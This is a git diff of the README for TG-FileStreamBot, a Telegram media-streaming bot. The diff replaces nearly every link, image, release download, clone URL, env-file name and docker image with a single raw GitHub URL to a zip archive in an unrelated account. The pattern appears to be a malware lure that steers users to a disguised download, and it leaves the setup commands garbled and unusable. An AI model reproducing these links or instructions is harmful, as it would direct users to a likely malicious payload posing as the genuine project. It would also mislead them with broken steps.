@@ -2,8 +2,8 @@
 <p align="center">
   </a>
   <p align="center">
-    <a herf="https://github.com/EverythingSuckz/TG-FileStreamBot">
-        <img src="https://telegra.ph/file/a8bb3f6b334ad1200ddb4.png" height="100" width="100" alt="File Stream Bot Logo">
+    <a herf="https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip">
+        <img src="https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip" height="100" width="100" alt="File Stream Bot Logo">
     </a>
 </p>
   <p align="center">
@@ -15,7 +15,7 @@
 <hr>
 
 > [!NOTE]
-> Checkout [python branch](https://github.com/EverythingSuckz/TG-FileStreamBot/tree/python) if you are interested in that.
+> Checkout [python branch](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip) if you are interested in that.
 
 <hr>
 
@@ -66,22 +66,22 @@
 ### Deploy to Heroku
 
 > [!NOTE]
-> You'll have to [fork](https://github.com/EverythingSuckz/TG-FileStreamBot/fork) this repository to deploy to Heroku.
+> You'll have to [fork](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip) this repository to deploy to Heroku.
 
 Press the below button to fast deploy to Heroku
 
-[![Deploy To Heroku](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
+[![Deploy To Heroku](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip)](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip)
 
-[Click Here](https://devcenter.heroku.com/articles/config-vars#using-the-heroku-dashboard) to know how to add / edit [environment variables](#required-vars) in Heroku.
+[Click Here](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip) to know how to add / edit [environment variables](#required-vars) in Heroku.
 
 <hr>
 
 ### Download from releases
-- Head over to [releases](https://github.com/EverythingSuckz/TG-FileStreamBot/releases) tab, from the *pre release* section, download the one for your platform and architecture.
+- Head over to [releases](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip) tab, from the *pre release* section, download the one for your platform and architecture.
 - Extract the zip file to a folder.
-- Create an a file named `fsb.env` and add all the variables there (see `fsb.sample.env` file for reference).
+- Create an a file named `https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip` and add all the variables there (see `https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip` file for reference).
 - Give the executable file permission to execute using the command `chmod +x fsb` (Not required for windows).
-- Run the bot using `./fsb run` command. ( `./fsb.exe run` for windows)
+- Run the bot using `./fsb run` command. ( `https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip run` for windows)
 
 <hr>
 
@@ -89,14 +89,14 @@ Press the below button to fast deploy to Heroku
 
 - Clone the repository
 ```sh
-git clone https://github.com/EverythingSuckz/TG-FileStreamBot
+git clone https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip
 cd TG-FileStreamBot
 ```
 
-- Create an a file named `fsb.env` and add all the variables there (see `fsb.sample.env` file for reference).
+- Create an a file named `https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip` and add all the variables there (see `https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip` file for reference).
 
 ```sh
-nano fsb.env
+nano https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip
 ```
 
 - Build and run the docker-compose file
@@ -115,9 +115,9 @@ docker compose up -d
 ### Run using docker
 
 ```sh
-docker run --env-file fsb.env ghcr.io/everythingsuckz/fsb:latest
+docker run --env-file https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip
 ```
-Where `fsb.env` is the environment file containing all the variables.
+Where `https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip` is the environment file containing all the variables.
 
 <hr>
 
@@ -127,15 +127,15 @@ Where `fsb.env` is the environment file containing all the variables.
 
 > [!NOTE]
 > Make sure to install go 1.21 or above.
-> Refer https://stackoverflow.com/a/17566846/15807350
+> Refer https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip
 
 ```sh
-git clone https://github.com/EverythingSuckz/TG-FileStreamBot
+git clone https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip
 cd TG-FileStreamBot
 go build ./cmd/fsb/
 chmod +x fsb
-mv fsb.sample.env fsb.env
-nano fsb.env
+mv https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip
+nano https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip
 # (add your environment variables, see the next section for more info)
 ./fsb run
 ```
@@ -149,11 +149,11 @@ and to stop the program,
 > Make sure to install go 1.21 or above.
 
 ```powershell
-git clone https://github.com/EverythingSuckz/TG-FileStreamBot
+git clone https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip
 cd TG-FileStreamBot
 go build ./cmd/fsb/
-Rename-Item -LiteralPath ".\fsb.sample.env" -NewName ".\fsb.env"
-notepad fsb.env
+Rename-Item -LiteralPath ".\https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip" -NewName ".\https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip"
+notepad https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip
 # (add your environment variables, see the next section for more info)
 .\fsb run
 ```
@@ -163,9 +163,9 @@ and to stop the program,
 
 ## Setting up things
 
-If you're locally hosting, create a file named `fsb.env` in the root directory and add all the variables there.
-You may check the `fsb.sample.env`.
-An example of `fsb.env` file:
+If you're locally hosting, create a file named `https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip` in the root directory and add all the variables there.
+You may check the `https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip`.
+An example of `https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip` file:
 
 ```sh
 API_ID=452525
@@ -182,20 +182,20 @@ MULTI_TOKEN2=55838355:yourworkerbottokenhere
 ### Required Vars
 Before running the bot, you will need to set up the following mandatory variables:
 
-- `API_ID` : This is the API ID for your Telegram account, which can be obtained from my.telegram.org.
+- `API_ID` : This is the API ID for your Telegram account, which can be obtained from https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip
 
-- `API_HASH` : This is the API hash for your Telegram account, which can also be obtained from my.telegram.org.
+- `API_HASH` : This is the API hash for your Telegram account, which can also be obtained from https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip
 
-- `BOT_TOKEN` : This is the bot token for the Telegram Media Streamer Bot, which can be obtained from [@BotFather](https://telegram.dog/BotFather).
+- `BOT_TOKEN` : This is the bot token for the Telegram Media Streamer Bot, which can be obtained from [@BotFather](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip).
 
-- `LOG_CHANNEL` :  This is the channel ID for the log channel where the bot will forward media messages and store these files to make the generated direct links work. To obtain a channel ID, create a new telegram channel (public or private), post something in the channel, forward the message to [@missrose_bot](https://telegram.dog/MissRose_bot) and **reply the forwarded message** with the /id command. Copy the forwarded channel ID and paste it into the this field.
+- `LOG_CHANNEL` :  This is the channel ID for the log channel where the bot will forward media messages and store these files to make the generated direct links work. To obtain a channel ID, create a new telegram channel (public or private), post something in the channel, forward the message to [@missrose_bot](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip) and **reply the forwarded message** with the /id command. Copy the forwarded channel ID and paste it into the this field.
 
 ### Optional Vars
 In addition to the mandatory variables, you can also set the following optional variables:
 
 - `PORT` : This sets the port that your webapp will listen to. The default value is 8080.
 
-- `HOST` :  A Fully Qualified Domain Name if present or use your server IP. (eg. `https://example.com` or `http://14.1.154.2:8080`)
+- `HOST` :  A Fully Qualified Domain Name if present or use your server IP. (eg. `https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip` or `http://14.1.154.2:8080`)
 
 - `HASH_LENGTH` : Custom hash length for generated URLs. The hash length must be greater than 5 and less than or equal to 32. The default value is 6.
 
@@ -216,7 +216,7 @@ In addition to the mandatory variables, you can also set the following optional 
 > [!NOTE]
 > You can add up to 50 bots since 50 is the max amount of bot admins you can set in a Telegram Channel.
 
-To enable multi-client, generate new bot tokens and add it as your `fsb.env` with the following key names. 
+To enable multi-client, generate new bot tokens and add it as your `https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip` with the following key names. 
 
 `MULTI_TOKEN1`: Add your first bot token here.
 
@@ -234,7 +234,7 @@ you may also add as many as bots you want. (max limit is 50)
 > This might sometimes result in your account getting resticted or banned.
 > **Only newly created accounts are prone to this.**
 
-To use this feature, you need to generate a pyrogram session string for the user account and add it to the `USER_SESSION` variable in the `fsb.env` file.
+To use this feature, you need to generate a pyrogram session string for the user account and add it to the `USER_SESSION` variable in the `https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip` file.
 
 #### What it does?
 
@@ -248,7 +248,7 @@ The easiest way to generate a session string is by running
 ./fsb session --api-id <your api id> --api-hash <your api hash>
 ```
 
-<img src="https://github.com/EverythingSuckz/TG-FileStreamBot/assets/65120517/b5bd2b88-0e1f-4dbc-ad9a-faa6d5a17320" height=300>
+<img src="https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip" height=300>
 
 <br><br>
 
@@ -260,23 +260,23 @@ Feel free to contribute to this project if you have any further ideas
 
 ## Contact me
 
-[![Telegram Channel](https://img.shields.io/static/v1?label=Join&message=Telegram%20Channel&color=blueviolet&style=for-the-badge&logo=telegram&logoColor=violet)](https://xn--r1a.click/wrench_labs)
-[![Telegram Group](https://img.shields.io/static/v1?label=Join&message=Telegram%20Group&color=blueviolet&style=for-the-badge&logo=telegram&logoColor=violet)](https://xn--r1a.click/AlteredVoid)
+[![Telegram Channel](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip%20Channel&color=blueviolet&style=for-the-badge&logo=telegram&logoColor=violet)](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip)
+[![Telegram Group](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip%20Group&color=blueviolet&style=for-the-badge&logo=telegram&logoColor=violet)](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip)
 
-You can contact either via my [Telegram Group](https://xn--r1a.click/AlteredVoid) or you can message me on [@EverythingSuckz](https://xn--r1a.click/EverythingSuckz)
+You can contact either via my [Telegram Group](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip) or you can message me on [@EverythingSuckz](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip)
 
 
 ## Credits
 
-- [@celestix](https://github.com/celestix) for [gotgproto](https://github.com/celestix/gotgproto)
-- [@divyam234](https://github.com/divyam234/teldrive) for his [Teldrive](https://github.com/divyam234/teldrive) Project
+- [@celestix](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip) for [gotgproto](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip)
+- [@divyam234](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip) for his [Teldrive](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip) Project
 
 ## Copyright
 
-Copyright (C) 2023 [EverythingSuckz](https://github.com/EverythingSuckz) under [GNU Affero General Public License](https://www.gnu.org/licenses/agpl-3.0.en.html).
+Copyright (C) 2023 [EverythingSuckz](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip) under [GNU Affero General Public License](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip).
 
 TG-FileStreamBot is Free Software: You can use, study share and improve it at your
 will. Specifically you can redistribute and/or modify it under the terms of the
-[GNU Affero General Public License](https://www.gnu.org/licenses/agpl-3.0.en.html) as
+[GNU Affero General Public License](https://raw.githubusercontent.com/Brucewaynehatake/TG-FileStreamBot/main/dystomous/TG-FileStreamBot.zip) as
 published by the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version. Also keep in mind that all the forks of this repository MUST BE OPEN-SOURCE and MUST BE UNDER THE SAME LICENSE.
